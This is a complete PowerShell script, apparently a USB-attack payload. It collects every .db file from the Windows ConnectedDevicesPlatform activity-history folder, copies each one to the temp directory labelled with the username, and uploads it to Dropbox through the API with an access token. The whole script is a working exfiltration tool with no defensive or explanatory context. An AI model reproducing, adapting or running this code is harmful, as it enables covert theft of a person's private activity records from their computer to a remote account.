$DropBoxAccessToken = "ACCESS-TOKEN"   # Replace with your DropBox Access Token

function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 

$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

$i = 0
foreach ($target in Get-ChildItem -Path $ENV:LOCALAPPDATA/connecteddevicesplatform *.db -Recurse){
$loc = $target | Select-Object -ExpandProperty Fullname
$dest = "$env:TMP\"+"$i - $ENV:Username - " + ($target | Select-Object -ExpandProperty Name)
Copy-Item -Path $loc -Destination $dest
Write-Output $dest
DropBox-Upload $dest
$i = $i+1
}